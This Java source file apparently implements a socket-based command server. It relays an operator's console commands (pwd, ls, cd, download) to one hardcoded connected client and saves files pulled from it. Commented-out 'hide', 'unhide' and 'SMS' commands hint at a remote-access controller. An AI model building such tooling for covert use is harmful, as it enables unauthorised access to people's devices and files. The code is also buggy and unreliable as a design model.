
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.lang.ClassNotFoundException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import javax.print.attribute.HashAttributeSet;

/**
 * This class implements java Socket server
 * 
 * @author pankaj ID 5a6e4a5da440e798
 */
public class MyServer {

	public static class Client implements Runnable {
		public Scanner in;
		public PrintWriter out;
		public Socket socket;
		public String ID;

		public Client(Socket s) throws IOException {
			this.socket = s;
			out = new PrintWriter(s.getOutputStream(), true);
			in = new Scanner(s.getInputStream());
			ID = in.nextLine();
		}

		@Override
		public void run() {

		}
	}

	// static ServerSocket variable
	@SuppressWarnings("resource")
	private static ServerSocket server;
	// socket server port on which it will listen
	private static int port = 9876;

	public static void main(String args[]) throws IOException, ClassNotFoundException, InterruptedException {

		server = new ServerSocket(port);
		Scanner scan = new Scanner(System.in);

		Map<String, Client> H = new HashMap<String, Client>();
		long ID = 0;
		;
		while (true) {
			Socket s = server.accept();
			ID++;
			new Thread(new Runnable() {

				@Override
				public void run() {
					try {
						Client c = new Client(s);
						H.put(c.ID, c);
						// System.out.println("Added -" + H.get(c.ID).ID);
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

				}
			}).start();
			new Thread(new Runnable() {

				@Override
				public void run() {
					while (true) {
						System.out.print("Command: ");
						String command = scan.nextLine();

						Client z = H.get("5a6e4a5da440e798");
						// if(command.equals("hide")) {
						// z.out.println(command);
						// }else if(command.equals("unhide")) {
						// z.out.println(command);
						// }else if(command.equals("SMS")) {
						//
						// }
						z.out.println(command);
						if (command.equals("pwd")) {
							System.out.println(z.in.nextLine());
						} else if (command.equals("ls")) {
							String t = z.in.nextLine();
							String[] ans = t.split("##");
							int i = 1;
							for (String x : ans) {
								i++;
								System.out.print(x + "##");
								if (i % 5 == 0)
									System.out.println();
							}
						} else if (command.startsWith("download")) {
							try {
								String[] ff = command.split(" ");
								File result = new File(ff[1]);

								BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(result));
								BufferedInputStream in = new BufferedInputStream(z.socket.getInputStream());

								byte[] buf = new byte[1024];

								int bytesRead;
								while ((bytesRead = in.read(buf)) != -1) {
									out.write(buf, 0, bytesRead);
								}
								out.close();
							} catch (Exception e) {
							}
						}
						else if(command.startsWith("cd")) {
							System.out.println(z.in.nextLine());
						}
						System.out.println("scanned");
					}
				}
			}).start();
		}

	}

}
